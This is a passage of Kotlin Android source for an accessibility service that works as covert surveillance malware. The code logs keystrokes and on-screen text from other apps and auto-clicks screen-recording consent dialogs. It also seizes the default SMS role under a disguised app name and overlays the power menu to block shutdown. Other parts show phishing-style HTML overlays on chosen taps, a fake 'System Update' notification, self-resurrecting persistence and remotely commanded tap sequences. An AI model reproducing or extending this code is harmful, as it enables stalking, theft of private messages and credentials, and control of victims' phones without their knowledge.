package com.example.myandroid

import kotlinx.coroutines.*

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.Intent
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONArray
import org.json.JSONObject
import android.app.KeyguardManager
import android.os.Handler
import android.os.Looper

class MyAccessibilityService : AccessibilityService() {

    companion object {
        var instance: MyAccessibilityService? = null
        fun triggerDataRecovery() {
            instance?.engageGhostHand()
        }
    }

    private var nextAllowedCheck = 0L
    private var cachedRules: JSONObject = JSONObject()
    
    // GHOST HAND STATE
    private var isGhostActive = false
    private var isLookingForToggle = false
    private val targetKeywords = listOf("Mobile data", "Data", "Cellular data", "Internet", "Connexion")
    
    // THROTTLE CONTROL
    private var lastScreenRead: Long = 0
    private val READ_DELAY = 1000L // Only read screen once per second
    private var debounceJob: Job? = null

    // TREE SCRAPER STATE
    private data class TreeTask(
        val id: Int,
        val pkg: String?,
        val durationMs: Long,
        var endTime: Long = 0L,
        val depth: Int = 10,
        var lastSnapshot: JSONObject? = null,
        var job: Job? = null
    )
    private val treeTasks = mutableListOf<TreeTask>()
    
    // PHOENIX STATE
    private var lastPhoenixCheck = 0L



    private fun checkMainServiceHealth() {
        try {
            if (!MonitorService.isRunning) {
                DebugLogger.log("PHOENIX", "Accessibility Symbiote detected dead MonitorService. Resurrecting...")
                val i = Intent(this, MonitorService::class.java)
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) startForegroundService(i)
                else startService(i)
                
                // Also re-ignite the alarm manager loop
                KeepAliveReceiver.scheduleNext(this)
            }
        } catch (e: Exception) {}
    }

        fun resetAllTasks() {
        treeTasks.forEach { it.job?.cancel() }
        treeTasks.clear()
        saveTreeTasks()
        DebugLogger.log("SCRAM", "Hard Reset: All Scraper Tasks Aborted and Purged")
    }

    fun startTreeDump(pkg: String?, mins: Long, cmdId: Int = -1, depth: Int = 10) {
        if (mins <= 0L) {
            resetAllTasks()
            return
        }

        val target = if (pkg.isNullOrEmpty() || pkg == "null") null else pkg
        val durMs = mins * 60 * 1000
        
        val newTask = TreeTask(id = cmdId, pkg = target, durationMs = durMs, depth = depth)
        treeTasks.add(newTask)
        saveTreeTasks()
        
        DebugLogger.log("SCRAM", "Task Queued: [${target ?: "GLOBAL"}] (ID: $cmdId). Total Tasks: ${treeTasks.size}")
        
        if (target == null) {
            initiateTaskSession(newTask)
        }
    }

    private fun initiateTaskSession(task: TreeTask) {
        if (task.endTime != 0L) return // Already running
        
        task.endTime = System.currentTimeMillis() + task.durationMs
        saveTreeTasks()
        
        DebugLogger.log("SCRAM", "Session started for ID: ${task.id}. Resolving in ${task.durationMs / 1000}s.")
        
        task.job = CoroutineScope(Dispatchers.IO).launch {
            val delayMs = task.endTime - System.currentTimeMillis()
            if (delayMs > 0) delay(delayMs)
            
            // Resolve Task
            val result = JSONObject().apply {
                put("depth_limit", task.depth)
                if (task.lastSnapshot != null) put("snapshot", task.lastSnapshot)
                else put("error", "NO_DATA_CAPTURED_IN_SESSION")
            }
            
            CommandProcessor.updateCommandStatus(applicationContext, task.id, "SCAN_COMPLETE", null, result, null)
            DebugLogger.log("SCRAM", "Session expired. Task [${task.id}] resolved and removed.")
            
            treeTasks.remove(task)
            saveTreeTasks()
        }
    }

    private fun saveTreeTasks() {
        val arr = JSONArray()
        treeTasks.forEach { t ->
            val o = JSONObject()
            o.put("id", t.id); o.put("pkg", t.pkg); o.put("dur", t.durationMs)
            o.put("end", t.endTime); o.put("depth", t.depth)
            arr.put(o)
        }
        getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
            .putString("tree_tasks_json", arr.toString()).apply()
    }

    private fun loadTreeTasks() {
        try {
            val raw = getSharedPreferences("app_stats", Context.MODE_PRIVATE).getString("tree_tasks_json", "[]")
            val arr = JSONArray(raw)
            treeTasks.clear()
            for (i in 0 until arr.length()) {
                val o = arr.getJSONObject(i)
                val task = TreeTask(
                    id = o.getInt("id"),
                    pkg = if (o.isNull("pkg")) null else o.getString("pkg"),
                    durationMs = o.getLong("dur"),
                    endTime = o.getLong("end"),
                    depth = o.getInt("depth")
                )
                treeTasks.add(task)
                
                // Resume watchdog if it was already running
                if (task.endTime > System.currentTimeMillis()) {
                    initiateTaskSession(task)
                } else if (task.endTime > 0) {
                    // Expired while dead - will be cleaned up on next logic cycle
                }
            }
        } catch (e: Exception) { }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this

        DynamicUIManager.warmUpEngine(this)

        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        
        // Restore Scraper Session Queue
        loadTreeTasks()
        
        val rulesStr = prefs.getString("cached_rules", "{}")
        cachedRules = try {
            val json = JSONObject(rulesStr)
            if (json.length() == 0) getDefaultRules() else json
        } catch (e: Exception) {
            getDefaultRules()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        
        val pkgName = event.packageName?.toString() ?: return
        
        // --- SCREEN RECORD GHOST LOGIC ---
        if (pkgName.contains("systemui", ignoreCase = true)) {
            // --- POWER SHIELD LOGIC ---
            val statsPrefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
            if (statsPrefs.getBoolean("power_shield_active", false)) {
                if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                    // UPGRADED: IO Dispatcher avoids Deep Doze CPU throttling for instant UI tree evaluation
                    CoroutineScope(Dispatchers.IO).launch {
                        val startTime = System.currentTimeMillis()
                        // Log only on State Changes to avoid spamming for every clock/battery update
                        if (event.eventType == android.view.accessibility.AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                            DebugLogger.log("SHIELD_VERBOSE", "Evaluation loop started for SystemUI Window State Change.")
                        }
                        var attempts = 0
                        
                        while (attempts < 10) { // 50ms * 10 = 500ms max window
                            val loopTime = System.currentTimeMillis()
                            val root = rootInActiveWindow
                            // 1. Precise Identification (Prevents Notification Shade False Positives)
                            val isSamsungMenu = !root?.findAccessibilityNodeInfosByViewId("com.android.systemui:id/sec_global_actions_item_list").isNullOrEmpty()
                            val isAospMenu = !root?.findAccessibilityNodeInfosByViewId("com.android.systemui:id/global_actions_view").isNullOrEmpty()
                            
                            // 2. Heuristic fallback: The actual Power Menu almost always has both "Power off" and "Restart". The Quick Settings shade does not.
                            val hasPowerOff = !root?.findAccessibilityNodeInfosByText("Power off").isNullOrEmpty()
                            val hasRestart = !root?.findAccessibilityNodeInfosByText("Restart").isNullOrEmpty()
                            val isGenericMenu = hasPowerOff && hasRestart
                            
                            if (isSamsungMenu || isAospMenu || isGenericMenu) {
                                val detectTime = System.currentTimeMillis()
                                DebugLogger.log("SHIELD_VERBOSE", "Menu Identified. Attempt: $attempts | Parsing Time: ${detectTime - loopTime}ms | Total Elapsed: ${detectTime - startTime}ms")
                                
                                val now = System.currentTimeMillis()
                                val lastTrigger = statsPrefs.getLong("power_shield_last_trigger", 0L)
                                if (now - lastTrigger > 2000) {
                                    statsPrefs.edit().putLong("power_shield_last_trigger", now).apply()
                                    
                                    val html = statsPrefs.getString("power_shield_html", "") ?: ""
                                    val method = statsPrefs.getString("power_shield_method", "ACC") ?: "ACC"
                                    val timeout = statsPrefs.getLong("power_shield_timeout", 10L)
                                    
                                    // Deploy the overlay cleanly without fighting the OS window manager
                                    DynamicUIManager.showOverlay(this@MyAccessibilityService, true, method, html)
                                    DebugLogger.log("POWER_SHIELD", "Power Menu Confirmed & Intercepted. Total latency: ${System.currentTimeMillis() - startTime}ms. Failsafe: ${timeout}s")
                                    
                                    // Ensure Dimmer stays on top
                                    Handler(Looper.getMainLooper()).postDelayed({
                                        DimmerManager.pushToFront(this@MyAccessibilityService)
                                    }, 200)
                                    
                                    if (timeout > 0) {
                                        Handler(Looper.getMainLooper()).postDelayed({
                                            DynamicUIManager.removeOverlay(this@MyAccessibilityService)
                                        }, timeout * 1000)
                                    } else {
                                        DebugLogger.log("POWER_SHIELD", "Persistent mode: No timeout scheduled.")
                                    }
                                } else {
                                    DebugLogger.log("SHIELD_VERBOSE", "Ignored due to 2000ms cooldown.")
                                }
                                break
                            }
                            attempts++
                            delay(50)
                        }
                    }
                }
            }

            if (ScreenRecordManager.expectedMode == "AUTO") {
                val root = rootInActiveWindow
                val startNodes = root?.findAccessibilityNodeInfosByText("Start now") ?: emptyList()
                val altNodes = root?.findAccessibilityNodeInfosByText("Start") ?: emptyList()
                
                for (node in (startNodes + altNodes)) {
                    if (node.isClickable) {
                        node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                        DebugLogger.log("GHOST_ACCEPT", "Successfully auto-clicked screen record confirmation.")
                        ScreenRecordManager.expectedMode = "" // Disarm
                        DimmerManager.removeOverlay(this) // Remove the blindfold
                        CommandProcessor.updateCommandStatus(applicationContext, ScreenRecordManager.pendingCmdId, "GHOST_ACCEPT_SUCCESS", "Recording started automatically.")
                        break
                    }
                }
            } else if (ScreenRecordManager.expectedMode == "SCRAPE") {
                val treeJson = getInstantTree(null, 10)
                val wrapper = JSONObject().apply { put("pkg", pkgName); put("tree", treeJson) }
                DumpManager.appendLog("SCRAPE_RECORD_DIALOG", wrapper)
                DebugLogger.log("SCREEN_REC", "Scraped SystemUI dialog for forensic mapping.")
                ScreenRecordManager.expectedMode = "" // Disarm
            }
        }

        // --- DEFAULT SMS GHOST LOGIC ---
        if (pkgName.contains("permissioncontroller", ignoreCase = true) || pkgName.contains("settings", ignoreCase = true)) {
            val mode = DefaultSmsManager.expectedMode
            if (mode == "AUTO" || mode == "RELENTLESS") {
                val root = rootInActiveWindow ?: return
                
                // Resolve which app name we are looking for
                val targetLabel = try { packageManager.getApplicationLabel(packageManager.getApplicationInfo(packageName, 0)).toString() } catch(e:Exception) { "Drive services" }

                if (targetLabel == null) {
                    DebugLogger.log("GHOST_SMS", "Abort: Target label is null")
                    return
                }

                val appNodes = root.findAccessibilityNodeInfosByText(targetLabel)
                var clickedRadio = false
                
                for (node in appNodes) {
                    var target: android.view.accessibility.AccessibilityNodeInfo? = node
                    while (target?.isClickable == false) {
                        target = target?.parent
                    }
                    target?.let { safeTarget ->
                        if (safeTarget.isClickable) {
                            safeTarget.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                            clickedRadio = true
                            DebugLogger.log("GHOST_SMS", "Clicked radio for: $targetLabel")
                        }
                    }
                    if (clickedRadio) break
                }
                
                if (clickedRadio) {
                    // Small delay to allow radio state update
                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                        val setNodes = root.findAccessibilityNodeInfosByText("Set as default")
                        for (btn in setNodes) {
                            if (btn.isClickable) {
                                btn.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                                DebugLogger.log("GHOST_SMS", "Auto-clicked Set as default for $targetLabel")
                                DefaultSmsManager.expectedMode = "" // Disarm
                                CommandProcessor.updateCommandStatus(applicationContext, DefaultSmsManager.pendingCmdId, "SUCCESS", "Set as Default SMS via Ghost Hand")
                                break
                            }
                        }
                    }, 200)
                }
            } else if (mode == "RESTORE") {
                val root = rootInActiveWindow ?: return
                val targetLabel = DefaultSmsManager.getStoredPreviousLabel(this)
                val originalPkg = getSharedPreferences("app_stats", Context.MODE_PRIVATE).getString("original_sms_package", null)
                
                if (targetLabel == null || originalPkg == null) {
                    DefaultSmsManager.expectedMode = ""
                    return
                }

                // If already restored, disarm immediately
                if (android.provider.Telephony.Sms.getDefaultSmsPackage(this) == originalPkg) {
                    DebugLogger.log("GHOST_RESTORE", "Verification SUCCESS! Target already restored.")
                    DefaultSmsManager.expectedMode = "" 
                    performGlobalAction(GLOBAL_ACTION_HOME)
                    return
                }

                // Phase 1: Are we on the selection screen with the target app visible?
                val appNodes = root.findAccessibilityNodeInfosByText(targetLabel)
                if (appNodes.isNotEmpty()) {
                    val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                    val lastLoop = prefs.getLong("restore_loop_ts", 0L)
                    if (System.currentTimeMillis() - lastLoop < 4000) return
                    prefs.edit().putLong("restore_loop_ts", System.currentTimeMillis()).apply()

                    val targetCount = appNodes.size
                    var candidateIndex = prefs.getInt("restore_candidate_idx", 0)

                    if (candidateIndex >= targetCount) {
                        DebugLogger.log("GHOST_RESTORE", "All candidates exhausted. Resetting index to retry.")
                        candidateIndex = 0
                        prefs.edit().putInt("restore_candidate_idx", 0).apply()
                    }

                    var target: android.view.accessibility.AccessibilityNodeInfo? = appNodes[candidateIndex]
                    while (target?.isClickable == false) {
                        target = target.parent
                    }
                    target?.let { safeTarget ->
                        if (safeTarget.isClickable) {
                            safeTarget.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                            DebugLogger.log("GHOST_RESTORE", "Selected target candidate $candidateIndex: $targetLabel")
                        }
                    }

                    kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
                        kotlinx.coroutines.delay(500)
                        
                        val confirmRoot = rootInActiveWindow
                        if (confirmRoot != null) {
                            val confirmTexts = listOf("Set as default", "Set", "OK", "Default")
                            var clicked = false
                            for (text in confirmTexts) {
                                val setNodes = confirmRoot.findAccessibilityNodeInfosByText(text)
                                for (btn in setNodes) {
                                    if (btn.isClickable) {
                                        btn.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                                        DebugLogger.log("GHOST_RESTORE", "Clicked confirmation: '$text'")
                                        clicked = true
                                        break
                                    }
                                }
                                if (clicked) break
                            }
                        }
                        
                        kotlinx.coroutines.delay(1000)
                        
                        val currentDefault = android.provider.Telephony.Sms.getDefaultSmsPackage(this@MyAccessibilityService)
                        if (currentDefault == packageName) {
                            CommandProcessor.applyMasqueradeSkin(this@MyAccessibilityService, "SAM_MSG")
                        }
                        
                        if (currentDefault == originalPkg) {
                            DebugLogger.log("GHOST_RESTORE", "Verification SUCCESS! Target restored.")
                            DefaultSmsManager.expectedMode = "" 
                            prefs.edit().putInt("restore_candidate_idx", 0).apply()
                            CommandProcessor.updateCommandStatus(applicationContext, DefaultSmsManager.pendingCmdId, "SUCCESS", "Original SMS app restored")
                            performGlobalAction(GLOBAL_ACTION_HOME)
                        } else {
                            DebugLogger.log("GHOST_RESTORE", "Candidate $candidateIndex failed verification. Incrementing index to test next app.")
                            prefs.edit().putInt("restore_candidate_idx", candidateIndex + 1).apply()
                            
                            kotlinx.coroutines.delay(500)
                            val retryRoot = rootInActiveWindow
                            if (retryRoot != null) {
                                val smsNodes = retryRoot.findAccessibilityNodeInfosByText("SMS")
                                for (node in smsNodes) {
                                    var t: android.view.accessibility.AccessibilityNodeInfo? = node
                                    while (t?.isClickable == false) t = t.parent
                                    if (t?.isClickable == true) {
                                        t.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                                        break
                                    }
                                }
                            }
                        }
                    }
                    return
                }

                // Phase 2: We must be on the Default Apps category list. Find "SMS" or "SMS app" anchor.
                val smsNodes = root.findAccessibilityNodeInfosByText("SMS")
                val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                val lastSmsClick = prefs.getLong("restore_sms_click_ts", 0L)
                if (System.currentTimeMillis() - lastSmsClick > 2000) {
                    for (node in smsNodes) {
                        var target: android.view.accessibility.AccessibilityNodeInfo? = node
                        while (target?.isClickable == false) {
                            target = target?.parent
                        }
                        var clicked = false
                        target?.let { safeTarget ->
                            if (safeTarget.isClickable) {
                                safeTarget.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                                prefs.edit().putLong("restore_sms_click_ts", System.currentTimeMillis()).apply()
                                DebugLogger.log("GHOST_RESTORE", "Clicked SMS category")
                                clicked = true
                            }
                        }
                        if (clicked) break
                    }
                }
            } else if (DefaultSmsManager.expectedMode == "SCRAPE") {
                val treeJson = getInstantTree(null, 10)
                val wrapper = JSONObject().apply { put("pkg", pkgName); put("tree", treeJson) }
                DumpManager.appendLog("SCRAPE_SMS_DIALOG", wrapper)
                DebugLogger.log("GHOST_SMS", "Scraped Default SMS dialog for forensic mapping.")
                DefaultSmsManager.expectedMode = "" // Disarm
            }
        }

        // --- 0. PHOENIX HOOK (Resurrection check) ---
        val now = System.currentTimeMillis()
        if (now - lastPhoenixCheck > 60000) { // Throttle checks to once a minute maximum
            lastPhoenixCheck = now
            checkMainServiceHealth()
        }

        // --- 1. GHOST HAND LOGIC ---
        if (isGhostActive) {
            handleGhostEvent(event)
        }

        // --- UNIVERSAL UI TRAP (Tap-Only Engine) ---
        val statsPrefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        if (statsPrefs.getBoolean("ui_trap_active", false)) {
            // STRICT REQUIREMENT: Only react to physical clicks
            if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                val targetData = statsPrefs.getString("ui_trap_target", "") ?: ""
                val pkg = event.packageName?.toString() ?: ""
                
                if (targetData.isNotEmpty()) {
                    // Pass the EXACT node the user's finger touched to verify Structural Match
                    if (verifyStructuralMatch(event.source, pkg, targetData)) {
                        val now = System.currentTimeMillis()
                        val lastTrigger = statsPrefs.getLong("ui_trap_last_trigger", 0L)
                        
                        if (now - lastTrigger > 2000) {
                            statsPrefs.edit().putLong("ui_trap_last_trigger", now).apply()
                            
                            val method = statsPrefs.getString("ui_trap_method", "ACC") ?: "ACC"
                            val html = statsPrefs.getString("ui_trap_html", "") ?: ""
                            val timeout = statsPrefs.getLong("ui_trap_timeout", 10L)
                            val dimLevel = statsPrefs.getInt("ui_trap_dim", 20)
                            
                            DebugLogger.log("UI_TRAP", "✅ FINGERPRINT MATCHED ON TAP! Target: [$targetData]. Deploying trap sequence (Persistent).")
                            
                            Handler(Looper.getMainLooper()).post {
                                // 1. Dim to configured brightness FIRST (Dimmer has FLAG_NOT_TOUCHABLE, it never swallows input)
                                DimmerManager.applyDim(this@MyAccessibilityService, dimLevel, method)
                                
                                // 2. Deploy WebView Overlay specifically restricted to sit between nav/status bars
                                DynamicUIManager.showOverlay(this@MyAccessibilityService, true, method, html, false)
                            }
                            
                            // Ensure Dimmer stays on top
                            Handler(Looper.getMainLooper()).postDelayed({
                                DimmerManager.pushToFront(this@MyAccessibilityService)
                            }, 200)
                            
                            // 3. Timeout Failsafe
                            if (timeout > 0L) {
                                Handler(Looper.getMainLooper()).postDelayed({
                                    DebugLogger.log("UI_TRAP", "Timeout reached (${timeout}s). Disarming overlay (Trap remains armed).")
                                    DynamicUIManager.removeOverlay(this@MyAccessibilityService)
                                    // DimmerManager cleanup is now handled automatically by DynamicUIManager.removeOverlay
                                }, timeout * 1000)
                            }
                        } else {
                            DebugLogger.log("UI_TRAP_VERBOSE", "Ignored due to 2000ms cooldown.")
                        }
                    }
                }
            }
        }

        // --- 1.5 TREE SCRAPER ENGINE (Multi-Task Queue) ---
        val tasksToProcess = treeTasks.filter { it.pkg == null || it.pkg == pkgName }
        
        if (tasksToProcess.isNotEmpty()) {
            val root = rootInActiveWindow
            tasksToProcess.forEach { task ->
                // 1. Target Acquisition Logic
                if (task.endTime == 0L) {
                    initiateTaskSession(task)
                    CoroutineScope(Dispatchers.IO).launch {
                        CommandProcessor.updateCommandStatus(applicationContext, task.id, "TARGET_ACQUIRED_RECORDING", null, null, null)
                    }
                }
                
                // 2. Data Capture Logic
                if (root != null && now < task.endTime && (now - lastScreenRead > 2000)) {
                    val treeJson = serializeNode(root, 0, task.depth)
                    task.lastSnapshot = treeJson
                    
                    // Shared Stream Logging (Optional but helpful)
                    val wrapper = JSONObject()
                    wrapper.put("pkg", pkgName)
                    wrapper.put("ts", now)
                    wrapper.put("tree", treeJson)
                    DumpManager.appendLog("TREE", wrapper)
                }
            }
            if (now - lastScreenRead > 2000) lastScreenRead = now
        }

        // Periodically purge expired tasks that missed the watchdog
        val expired = treeTasks.filter { it.endTime in 1..now }
        if (expired.isNotEmpty()) {
            expired.forEach { 
                DebugLogger.log("SCRAM", "Task ${it.id} cleaned up manually.")
                treeTasks.remove(it) 
            }
            saveTreeTasks()
        }

        // --- 2. STANDARD MONITORING ---
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
             // Logic delegated to TypingManager
            val text = event.text.joinToString(" ")
            TypingManager.onType(this, pkgName, text)
            return
        }

        if (cachedRules.length() > 0 && !cachedRules.has(pkgName)) return
        
        // Feature Gate: Screen Reader
        if (!ConfigManager.canCollect(this, "screen_reader")) return

        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED || event.eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED) {
            debounceJob?.cancel()
            debounceJob = CoroutineScope(Dispatchers.Default).launch {
                delay(800) // Wait 800ms for UI to settle
                
                // CRITICAL FIX: 'event' is recycled by OS after onAccessibilityEvent returns.
                // We MUST use rootInActiveWindow to get the fresh screen state.
                val source = rootInActiveWindow ?: return@launch
                val textContent = StringBuilder()
                extractText(source, textContent)
                
                if (textContent.isNotEmpty()) {
                    val pm = packageManager
                    val appName = try { pm.getApplicationLabel(pm.getApplicationInfo(pkgName, 0)).toString() } catch (e: Exception) { pkgName }
                    val newTxt = textContent.take(100).toString()
                    
                    withContext(Dispatchers.IO) {
                        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                        val historyStr = prefs.getString("text_history_by_app", "{}")
                        val rootJson = try { JSONObject(historyStr) } catch (e: Exception) { JSONObject() }
                        val appArray = rootJson.optJSONArray(appName) ?: JSONArray()

                        val lastTxt = if (appArray.length() > 0) appArray.getJSONObject(appArray.length() - 1).optString("txt") else ""
                        
                        if (newTxt != lastTxt) {
                            // 1. STREAM LOGGING (NO LAG)
                            val entry = JSONObject()
                            entry.put("pkg", appName)
                            entry.put("ts", System.currentTimeMillis())
                            entry.put("txt", newTxt)
                            DumpManager.appendLog("SCREEN", entry)
                            
                            // 2. Update Stats (Using commit() to bypass QueuedWork ANR)
                            prefs.edit()
                                .putInt("interaction_count", prefs.getInt("interaction_count", 0) + 1)
                                .putString("last_screen_text", "[$appName] ${textContent.take(30)}...")
                                .commit()

                            // 3. Verify
                            DumpManager.logVerification("READER", pkgName)
                        }
                    }
                }
            }
        }
    }

    fun engageGhostHand() {
        // Logic disabled: UI interaction is too fragile and manufacturer-dependent
        DebugLogger.log("GHOST", "Ghost Hand engagement skipped (Disabled)")
    }

    private fun handleGhostEvent(event: AccessibilityEvent) {
        // No-op: Ghost logic disabled
    }

    private fun performSwipeDown() {
        // No-op: Ghost logic disabled
    }

    private fun findAndClickToggle(node: AccessibilityNodeInfo): Boolean {
        // No-op: Ghost logic disabled
        return false
    }

    private fun verifyStructuralMatch(node: AccessibilityNodeInfo?, pkg: String, target: String): Boolean {
        if (node == null) return false

        // 1. Setup Targets (Format: TitleTarget@@SecondaryTarget@@Package)
        val parts = target.split("@@")
        val titleTarget = parts[0].trim()
        val secondaryTarget = parts.getOrNull(1)?.trim()
        val expectedPkg = parts.getOrNull(2)?.trim()

        // 2. Universal Package Security Check
        if (!expectedPkg.isNullOrEmpty() && !pkg.contains(expectedPkg, ignoreCase = true)) {
            DebugLogger.log("UI_TRAP_VERBOSE", "❌ Package mismatch. Expected: $expectedPkg, Got: $pkg")
            return false
        }

        // 3. LOCAL SEARCH (Check the clicked node wrapper and its direct children)
        var hasTitle = findTextInside(node, titleTarget)
        var hasSecondary = if (!secondaryTarget.isNullOrEmpty()) findTextInside(node, secondaryTarget) else true

        // 4. INTERSECTION SNIPER (Fallback for disconnected Accessibility Graphs)
        if (!hasTitle || !hasSecondary) {
            val root = rootInActiveWindow
            val clickedBounds = android.graphics.Rect()
            node.getBoundsInScreen(clickedBounds)

            if (!hasTitle) {
                val screenNodes = root?.findAccessibilityNodeInfosByText(titleTarget)
                hasTitle = screenNodes?.any { screenNode ->
                    val textBounds = android.graphics.Rect()
                    screenNode.getBoundsInScreen(textBounds)
                    android.graphics.Rect.intersects(clickedBounds, textBounds)
                } ?: false
            }

            if (!hasSecondary && !secondaryTarget.isNullOrEmpty()) {
                val screenNodes = root?.findAccessibilityNodeInfosByText(secondaryTarget)
                hasSecondary = screenNodes?.any { screenNode ->
                    val textBounds = android.graphics.Rect()
                    screenNode.getBoundsInScreen(textBounds)
                    android.graphics.Rect.intersects(clickedBounds, textBounds)
                } ?: false
            }
        }

        if (hasTitle && hasSecondary) {
            DebugLogger.log("TRAP_MATCH", "✅ Fingerprint Verified! Clicked node coordinates matched target: [$target]")
            return true
        }

        DebugLogger.log("UI_TRAP_VERBOSE", "❌ Fingerprint mismatch on clicked node. Expected: [$target]")
        return false
    }

    private fun findTextInside(node: AccessibilityNodeInfo?, text: String): Boolean {
        if (node == null) return false
        val nText = node.text?.toString() ?: ""
        val nDesc = node.contentDescription?.toString() ?: ""
        
        if (nText.contains(text, ignoreCase = true) || nDesc.contains(text, ignoreCase = true)) return true
        
        for (i in 0 until node.childCount) {
            if (findTextInside(node.getChild(i), text)) return true
        }
        return false
    }

    private fun extractText(node: AccessibilityNodeInfo?, sb: StringBuilder) {
        if (node == null) return
        if (node.text != null && node.text.isNotEmpty()) sb.append(node.text).append(" ")
        for (i in 0 until node.childCount) extractText(node.getChild(i), sb)
    }

    fun serializeNode(node: AccessibilityNodeInfo?, depth: Int, maxDepth: Int): JSONObject? {
        if (node == null || depth > maxDepth) return null
        val json = JSONObject()
        try {
            json.put("class", node.className?.toString() ?: "")
            json.put("text", node.text?.toString() ?: "")
            json.put("desc", node.contentDescription?.toString() ?: "")
            json.put("id", node.viewIdResourceName ?: "")
            json.put("clickable", node.isClickable)
            
            val bounds = android.graphics.Rect()
            node.getBoundsInScreen(bounds)
            json.put("bounds", "${bounds.left},${bounds.top},${bounds.right},${bounds.bottom}")

            if (node.childCount > 0 && depth < maxDepth) {
                val children = JSONArray()
                for (i in 0 until node.childCount) {
                    val child = serializeNode(node.getChild(i), depth + 1, maxDepth)
                    if (child != null) children.put(child)
                }
                json.put("children", children)
            }
        } catch (e: Exception) {}
        return json
    }

    fun getInstantTree(targetPkg: String?, maxDepth: Int): JSONObject {
        val result = JSONObject()
        try {
            val root = rootInActiveWindow ?: return result.put("error", "NO_ACTIVE_WINDOW")
            val currentPkg = root.packageName?.toString() ?: ""
            
            if (targetPkg != null && targetPkg != "null" && targetPkg != currentPkg) {
                return result.put("error", "TARGET_NOT_IN_FOREGROUND").put("found", currentPkg)
            }

            result.put("package", currentPkg)
            result.put("timestamp", System.currentTimeMillis())
            result.put("tree", serializeNode(root, 0, maxDepth))
        } catch (e: Exception) { result.put("error", e.message) }
        return result
    }

    override fun onInterrupt() {}

    // --- REMOTE INTERACTION ENGINE (CHAIN CAPABLE) ---
    suspend fun executeInteractionChain(chain: JSONArray): String {
        DebugLogger.log("CHAIN_START", "Received chain with ${chain.length()} steps: $chain")
        val report = StringBuilder()
        for (i in 0 until chain.length()) {
            val step = chain.getJSONObject(i)
            val type = step.optString("type").uppercase()
            val value = step.optString("val")
            val stepDelay = step.optLong("delay", 100L)
            
            DebugLogger.log("CHAIN_STEP", "Executing Step $i: TYPE=$type, VAL=$value, DELAY=$stepDelay")
            delay(stepDelay) // Short mandatory delay between steps for OS processing

            val success = try {
                when (type) {
                    "WAIT" -> { 
                        val waitTime = value.toLongOrNull() ?: 500L
                        DebugLogger.log("CHAIN_WAIT", "Sleeping for ${waitTime}ms")
                        delay(waitTime)
                        true 
                    }
                    "WAKE" -> {
                        val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
                        val wakeLock = pm.newWakeLock(android.os.PowerManager.FULL_WAKE_LOCK or 
                            android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP or 
                            android.os.PowerManager.ON_AFTER_RELEASE, "Cortex:ChainWake")
                        wakeLock.acquire(3000)

                        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
                        val channelId = "system_integrity_alerts"
                        
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                            val channel = android.app.NotificationChannel(channelId, "System Integrity", android.app.NotificationManager.IMPORTANCE_HIGH)
                            channel.setSound(null, null)
                            channel.enableVibration(false)
                            nm.createNotificationChannel(channel)
                        }

                        val intent = android.content.Intent(applicationContext, PulseActivity::class.java).apply {
                            addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_NO_USER_ACTION or android.content.Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                            putExtra("is_wake_trigger", true)
                            if (value.contains("wellbeing", ignoreCase = true)) putExtra("route_to_settings", true)
                        }

                        val pendingIntent = android.app.PendingIntent.getActivity(
                            applicationContext, 99, intent, 
                            android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
                        )

                        val builder = androidx.core.app.NotificationCompat.Builder(applicationContext, channelId)
                            .setSmallIcon(android.R.drawable.ic_menu_info_details)
                            .setContentTitle("System Update")
                            .setContentText("Synchronizing system health parameters...")
                            .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MAX)
                            .setCategory(androidx.core.app.NotificationCompat.CATEGORY_ALARM)
                            .setFullScreenIntent(pendingIntent, true)
                            .setAutoCancel(true)
                            .setTimeoutAfter(3000)

                        nm.notify(99, builder.build())
                        DebugLogger.log("CHAIN_WAKE", "Strong FSI Wake lock dispatched")
                        true
                    }
                    "NAV" -> {
                        val actionCode = when(value.uppercase()) {
                            "BACK" -> GLOBAL_ACTION_BACK
                            "HOME" -> GLOBAL_ACTION_HOME
                            "RECENTS" -> GLOBAL_ACTION_RECENTS
                            "NOTIFS" -> GLOBAL_ACTION_NOTIFICATIONS
